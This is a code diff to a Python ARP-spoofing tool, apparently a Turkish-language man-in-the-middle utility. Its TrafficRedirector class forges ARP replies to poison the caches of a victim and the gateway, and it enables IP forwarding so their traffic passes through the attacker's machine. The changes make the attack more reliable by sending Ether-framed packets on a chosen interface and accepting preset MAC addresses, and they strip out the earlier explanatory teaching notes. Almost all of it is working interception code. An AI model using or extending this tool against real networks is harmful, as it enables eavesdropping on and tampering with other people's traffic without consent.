@@ -38,14 +38,15 @@ from typing import Optional
 
 try:
     from scapy.all import (
-        ARP, Ether, send, get_if_hwaddr, getmacbyip, conf
+        ARP, Ether, send, sendp, get_if_hwaddr, getmacbyip, conf
     )
     SCAPY_AVAILABLE = True
 except ImportError:
     SCAPY_AVAILABLE = False
 
 from modules.utils import (
-    cprint, Colors, separator, validate_ip, timestamp, get_local_ip
+    cprint, Colors, separator, validate_ip, timestamp, get_local_ip,
+    set_ip_forwarding
 )
 
 
@@ -100,50 +101,19 @@ class TrafficRedirector:
 
         Returns:
             bool: Başarılı ise True.
-
-        Eğitim Notu:
-            Linux  : /proc/sys/net/ipv4/ip_forward dosyasına '1' yaz
-            macOS  : sysctl -w net.inet.ip.forwarding=1
-            Windows: Registry veya netsh ile yapılır (bu araç Linux/macOS odaklı)
         """
-        system = platform.system()
-        try:
-            if system == "Linux":
-                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
-                    f.write("1")
-                cprint("  [✓] IP Forwarding ETKİNLEŞTİRİLDİ (Linux)", Colors.GREEN)
-            elif system == "Darwin":  # macOS
-                subprocess.run(
-                    ["sysctl", "-w", "net.inet.ip.forwarding=1"],
-                    capture_output=True, timeout=5
-                )
-                cprint("  [✓] IP Forwarding ETKİNLEŞTİRİLDİ (macOS)", Colors.GREEN)
-            elif system == "Windows":
-                cprint("  [!] Windows IP Forwarding: Ağ Bağdaştırıcısı → Özellikler → Paylaşım sekmesini kullanın.", Colors.YELLOW)
-                return False
-            return True
-        except (PermissionError, OSError) as e:
-            cprint(f"  [!] IP Forwarding etkinleştirilemedi: {e}", Colors.YELLOW)
-            logger.warning("IP Forwarding etkinleştirilemedi: %s", e)
-            return False
+        ok = set_ip_forwarding(True)
+        if ok:
+            cprint("  [✓] IP Forwarding ETKİNLEŞTİRİLDİ", Colors.GREEN)
+        else:
+            cprint("  [!] IP Forwarding etkinleştirilemedi", Colors.YELLOW)
+        return ok
 
     def disable_ip_forwarding(self) -> bool:
         """IP iletmeyi devre dışı bırakır (temizlik aşaması için)."""
-        system = platform.system()
-        try:
-            if system == "Linux":
-                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
-                    f.write("0")
-            elif system == "Darwin":
-                subprocess.run(
-                    ["sysctl", "-w", "net.inet.ip.forwarding=0"],
-                    capture_output=True, timeout=5
-                )
-            cprint("  [✓] IP Forwarding DEVRE DIŞI bırakıldı.", Colors.GRAY)
-            return True
-        except (PermissionError, OSError) as e:
-            logger.warning("IP Forwarding devre dışı bırakılamadı: %s", e)
-            return False
+        ok = set_ip_forwarding(False)
+        cprint("  [✓] IP Forwarding DEVRE DIŞI bırakıldı.", Colors.GRAY)
+        return ok
 
     # ── MAC Çözümleme ─────────────────────────────────────────────────────────
 
@@ -175,6 +145,7 @@ class TrafficRedirector:
     def _make_poison_packet(self, target_ip: str, target_mac: str, spoof_ip: str) -> object:
         """
         Hedef cihazın ARP cache'ini zehirlemek için sahte ARP yanıt paketi üretir.
+        Ether() wrapper ile L2 seviyesinde hedef MAC belirlenir ve doğru NIC'ten basılır.
 
         Args:
             target_ip:  Paketi alacak cihazın IP'si (gerçek hedef).
@@ -183,23 +154,23 @@ class TrafficRedirector:
                         (Gerçekte bu IP başka cihaza aittir.)
 
         Returns:
-            ARP paketi nesnesi.
-
-        Nasıl Çalışır:
-            ARP op=2 (is-at/yanıt) paketi oluşturulur.
-            hwsrc = Analiz makinesi MAC'i (gerçek gönderen)
-            psrc  = Sahte kaynak IP (hedefin gateway'i ya da kurban)
-            pdst  = Gerçek hedef IP
-            hwdst = Gerçek hedef MAC
-            ↑ Bu yapı, hedef cihazı "spoof_ip = benim MAC'im" diye kandırır.
+            Ether/ARP paketi nesnesi.
         """
-        return ARP(
+        src_mac = self.attacker_mac if self.attacker_mac and self.attacker_mac != "Bilinmiyor" else None
+        if not src_mac:
+            try:
+                src_mac = get_if_hwaddr(self.iface)
+            except Exception:
+                src_mac = None
+
+        arp = ARP(
             op=2,
-            pdst=target_ip,               # Kime gönderilecek (IP seviyesi)
-            hwdst=target_mac,             # Kime gönderilecek (MAC seviyesi)
-            psrc=spoof_ip,                # Sahte kaynak IP
-            # hwsrc default = makinenin gerçek MAC'i (attacker_mac)
+            pdst=target_ip,
+            hwdst=target_mac,
+            psrc=spoof_ip,
+            hwsrc=src_mac
         )
+        return Ether(dst=target_mac, src=src_mac) / arp if src_mac else arp
 
     def _make_restore_packet(
         self,
@@ -250,10 +221,9 @@ class TrafficRedirector:
                     self.gateway_ip, self.gateway_mac, self.target_ip
                 )
 
-                # verbose=False → terminal çıktısını bastır
-                # L3 send() kullanılır; iface parametresi L3'te etkisiz
-                send(pkt_to_target,  verbose=False)
-                send(pkt_to_gateway, verbose=False)
+                # sendp() ile doğrudan belirlenen arayüzden L2 gönderimi yap
+                sendp(pkt_to_target,  iface=self.iface, verbose=False)
+                sendp(pkt_to_gateway, iface=self.iface, verbose=False)
 
                 with self._pkt_lock:
                     self.packet_count += 2
@@ -310,6 +280,8 @@ class TrafficRedirector:
         self,
         target_ip: str,
         gateway_ip: str,
+        target_mac: Optional[str] = None,
+        gateway_mac: Optional[str] = None,
         enable_forwarding: bool = True
     ) -> bool:
         """
@@ -318,6 +290,8 @@ class TrafficRedirector:
         Args:
             target_ip:        Trafiği yönlendirilecek kurban IP'si.
             gateway_ip:       Yerel ağ geçidinin IP'si.
+            target_mac:       Önceden bilinen kurban MAC'i (None ise ARP ile çözülür).
+            gateway_mac:      Önceden bilinen gateway MAC'i (None ise ARP ile çözülür).
             enable_forwarding: IP iletimi etkinleştirilsin mi?
 
         Returns:
@@ -351,10 +325,10 @@ class TrafficRedirector:
         cprint(f"  [*] Arayüz  : {self.iface}", Colors.WHITE)
         separator()
 
-        # MAC adreslerini çöz
-        cprint("  [*] MAC adresleri çözümleniyor...", Colors.CYAN)
-        self.target_mac  = self._get_mac(target_ip)
-        self.gateway_mac = self._get_mac(gateway_ip)
+        # MAC adreslerini çöz veya hazır gelenleri kullan
+        cprint("  [*] MAC adresleri kontrol ediliyor...", Colors.CYAN)
+        self.target_mac  = target_mac or self._get_mac(target_ip)
+        self.gateway_mac = gateway_mac or self._get_mac(gateway_ip)
 
         if not self.target_mac:
             raise RuntimeError(f"Hedef MAC alınamadı ({target_ip}). Host aktif mi?")
